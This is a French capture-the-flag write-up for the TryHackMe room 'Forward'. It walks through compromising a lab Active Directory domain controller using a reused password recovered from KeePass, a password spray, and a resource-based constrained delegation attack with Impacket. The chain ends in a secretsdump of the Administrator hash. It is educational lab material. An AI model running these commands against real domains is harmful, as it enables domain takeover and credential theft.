---
title: "TryHackMe - Forward"
platform: "TryHackMe"
difficulty: "Medium"
tags: [windows,ctf,active directory,kerberos,rbcd,password reuse]
---

## Résumé

L'objectif de cette room est de compromettre un contrôleur de domaine Active Directory (DC01.ctf.local) en partant d'un compte utilisateur à faible privilège. La chaîne d'attaque enchaîne plusieurs mauvaises pratiques classiques en environnement d'entreprise : une base de mots de passe KeePass déverrouillée automatiquement par la session Windows, la réutilisation d'un mot de passe entre comptes (password spray), puis l'abus d'un droit AD oublié (AddAllowedToAct) pour mener une attaque de délégation contrainte basée sur les ressources (RBCD) jusqu'à Domain Admin.

## Techniques/Outils Utilisés

Reconnaissance :

Nmap, NetExec (nxc)

Accès Initial :

xfreerdp, KeePass, password spray

Elévation de privilèges :

Impacket (addcomputer.py, rbcd.py, getST.py, secretsdump.py)

## Reconnaissance

Un scan Nmap classique révèle un contrôleur de domaine Active Directory :

```bash
nmap -sC -sV -T4 10.128.179.11

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|_  DNS_Computer_Name: DC01.ctf.local
```

La combinaison Kerberos (88), LDAP (389/3268) et le nom NetBIOS DC01 confirme la cible : le contrôleur de domaine du domaine ctf.local.

## Exploitation initiale

La room fournit des identifiants de départ (j.smith / JSmith@IT2024). On les valide et on énumère les partages et utilisateurs du domaine avec NetExec :

```bash
nxc smb 10.128.179.11 -u 'ctf.local\j.smith' -p 'JSmith@IT2024' --shares
nxc smb 10.128.179.11 -u 'ctf.local\j.smith' -p 'JSmith@IT2024' --users

Administrator
Guest
krbtgt
j.smith        IT Staff
t.jones        Help Desk
r.williams     Help Desk Senior
svc.helpdesk   HelpDesk Service Acct```

Le partage SMB Downloads ne contient rien d'intéressant. On bascule sur une connexion RDP avec j.smith :

```bash
xfreerdp /v:10.128.179.11 /u:'j.smith' /p:'JSmith@IT2024' /d:ctf.local /dynamic-resolution /cert:ignore
```

Dans C:\Users\j.smith\Documents traîne une base KeePass (Database.kdbx). En l'ouvrant, aucun mot de passe maître n'est demandé : la base est configurée pour se déverrouiller automatiquement via le compte Windows courant (option "Windows User Account"), ce qui la rend accessible à quiconque contrôle la session j.smith.

Une entrée "Help Desk" y révèle des identifiants supplémentaires :

```bash
t.jones : Helpdesk01!
```

## Élévation de privilèges

j.smith → r.williams (réutilisation de mot de passe)

Le mot de passe récupéré dans KeePass est testé contre les autres comptes du domaine énumérés précédemment (password spray) :


```bash
nxc smb 10.128.179.11 -u 'r.williams' -p 'Helpdesk01!' --continue-on-success

SMB   10.128.179.11   445   DC01   [+] ctf.local\r.williams:Helpdesk01!```

r.williams (Help Desk Senior) réutilisait le même mot de passe que t.jones.

r.williams → Administrator (abus RBCD via droit AddAllowedToAct sur DC01$)

Une collecte BloodHound avec les identifiants de r.williams permet de cartographier ses droits AD :

```bash
bloodhound-python -u r.williams -p 'Helpdesk01!' -d ctf.local -ns 10.128.179.11 -c All --zip
```

L'analyse révèle que r.williams possède le droit AddAllowedToAct (écriture sur l'attribut msDS-AllowedToActOnBehalfOfOtherIdentity) directement sur l'objet ordinateur DC01$. Combiné à un MachineAccountQuota par défaut (10), ce droit ouvre une attaque de délégation contrainte basée sur les ressources (RBCD) permettant d'usurper n'importe quel compte, y compris Administrator.

Création d'un compte machine contrôlé :

```bash
addcomputer.py -computer-name 'EVILPC$' -computer-pass 'Passw0rd123!' \
  -dc-host DC01.ctf.local -domain-netbios CTF \
  'ctf.local/r.williams:Helpdesk01!'
```

Configuration de la délégation, en autorisant EVILPC$ à agir au nom de DC01$ :

```bash
rbcd.py -delegate-from 'EVILPC$' -delegate-to 'DC01$' -action write \
  'ctf.local/r.williams:Helpdesk01!'
```

Obtention d'un ticket de service par usurpation d'Administrator (S4U2Self/S4U2Proxy) :

```bash
getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip 10.128.179.11 \
  'ctf.local/EVILPC$:Passw0rd123!'
```

Le ticket est enregistré sous un nom généré automatiquement (Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache, pas simplement Administrator.ccache) :

```bash
export KRB5CCNAME=$(ls *.ccache | head -1)
```

Un dump complet NTDS via DRSUAPI échoue avec Policy SPN target name validation might be restricting full DRSUAPI dump, contourné en ciblant uniquement le compte Administrator :

```bash
secretsdump -k -no-pass -dc-ip 10.128.179.11 -just-dc-user Administrator DC01.ctf.local
```

Le hash NTLM d'Administrator est récupéré : accès complet au domaine.

## Conclusion

Une room bien construite sur les fondamentaux d'Active Directory : chaque étape correspond à une erreur de configuration réaliste (gestionnaire de mots de passe mal verrouillé, mot de passe help desk réutilisé, droit de délégation oublié sur le DC), sans passer par un exploit logiciel. Le point le plus formateur reste la chaîne RBCD elle-même, avec la mécanique complète Impacket (addcomputer.py → rbcd.py → getST.py → secretsdump.py) et ses petits pièges pratiques, comme le nommage automatique des fichiers ccache. Une bonne mise en pratique de l'abus d'ACL AD, en complément de ce que j'avais vu jusqu'ici côté Windows purement local.

Ecrit par [Clément MONCHAUX](https://tryhackme.com/p/clem.mchx)
